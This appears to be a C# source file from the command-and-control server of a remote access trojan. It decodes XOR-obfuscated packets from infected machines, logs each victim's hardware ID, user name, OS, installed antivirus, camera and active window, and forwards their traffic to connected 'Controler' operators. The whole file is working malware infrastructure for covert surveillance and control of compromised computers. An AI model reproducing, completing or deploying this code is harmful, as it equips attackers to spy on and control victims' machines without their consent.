using MessagePack;
using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Server
{
    public class HandlePacket
    {
        public Clients client;
        public byte[] data;

        public void Read(object o)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Helper.Xor(data));
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        {
                            Console.WriteLine("------------------------------");
                            Console.WriteLine();
                            Console.WriteLine("New connection established!");
                            Console.WriteLine();
                            Console.WriteLine("HWID:" + unpack_msgpack.ForcePathObject("HWID").AsString);
                            Console.WriteLine("User Name:"+unpack_msgpack.ForcePathObject("User").AsString);
                            Console.WriteLine("OS Version:" + unpack_msgpack.ForcePathObject("OS").AsString);
                            Console.WriteLine("Camera:" + unpack_msgpack.ForcePathObject("Camera").AsString);
                            Console.WriteLine("Path:" + unpack_msgpack.ForcePathObject("Path").AsString);
                            Console.WriteLine("Version:" + unpack_msgpack.ForcePathObject("Version").AsString);
                            Console.WriteLine("Permission:" + unpack_msgpack.ForcePathObject("Permission").GetAsInteger());
                            Console.WriteLine("Anti-Virus Product:" + unpack_msgpack.ForcePathObject("AV").AsString);
                            Console.WriteLine("Group:" + unpack_msgpack.ForcePathObject("Group").AsString);
                            Console.WriteLine("Active Window:" + unpack_msgpack.ForcePathObject("Active").AsString);



                            client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                            client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                            client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
                            client.Info.Camera = Convert.ToBoolean(unpack_msgpack.ForcePathObject("Camera").AsString);
                            client.Info.InstallType = unpack_msgpack.ForcePathObject("Install-Type").GetAsInteger();
                            client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                            client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                            client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
                            client.Info.Permission = unpack_msgpack.ForcePathObject("Permission").GetAsInteger();
                            client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                            client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                            client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
                            client.Info.LastPing = DateTime.Now; ;

                            if (Settings.Controler.Count>0)
                            {
                                unpack_msgpack.ForcePathObject("IP").AsString = client.Info.IP;
                                foreach (Clients client in Settings.Controler)
                                {
                                    ThreadPool.QueueUserWorkItem(client.BeginSend, unpack_msgpack.Encode2Bytes());
                                }
                            }

                            Settings.Online.Add(client);
                        }                        
                        break;

                    case "Controler":
                        {
                            //Check();
                            Console.WriteLine("Controler Connected");
                            Settings.Controler.Add(client);
                        }
                        break;

                    case "Ping":
                        {
                            Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    default:
                        {
                            foreach (Clients CL in Settings.Controler.ToList())
                            {
                                if (client.ID == unpack_msgpack.ForcePathObject("ID").AsString)
                                {
                                    ThreadPool.QueueUserWorkItem(CL.BeginSend, unpack_msgpack.Encode2Bytes());
                                }
                            }
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}
